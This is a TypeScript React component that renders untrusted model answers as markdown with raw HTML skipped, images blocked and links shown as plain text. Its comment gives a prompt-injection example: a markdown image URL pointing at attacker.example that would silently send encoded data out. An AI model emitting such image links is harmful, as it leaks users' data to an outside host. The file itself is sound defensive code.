import ReactMarkdown, { type Components } from "react-markdown";

/**
 * Markdown for text BakeFix did not write: model answers and document passages.
 *
 * - Raw HTML is dropped (`skipHtml`), so no scripts or styles get in.
 * - Images are never loaded. A prompt-injected answer could otherwise include
 *   `![](https://attacker.example/?q=…)`, and the browser would send that URL
 *   (and anything encoded in it) without a click.
 * - Links are not clickable; the address is shown as text, so the reader sees
 *   where it points before deciding to copy it.
 */
const SAFE_COMPONENTS: Components = {
  img: ({ alt }) => (
    <span className="md-blocked">[image{alt ? `: ${alt}` : ""}, not loaded]</span>
  ),
  a: ({ href, children }) => (
    <span className="md-link">
      {children}
      {href && String(children) !== href ? (
        <span className="md-link-address"> ({href})</span>
      ) : null}
    </span>
  ),
};

export function SafeMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown skipHtml components={SAFE_COMPONENTS}>
      {children}
    </ReactMarkdown>
  );
}
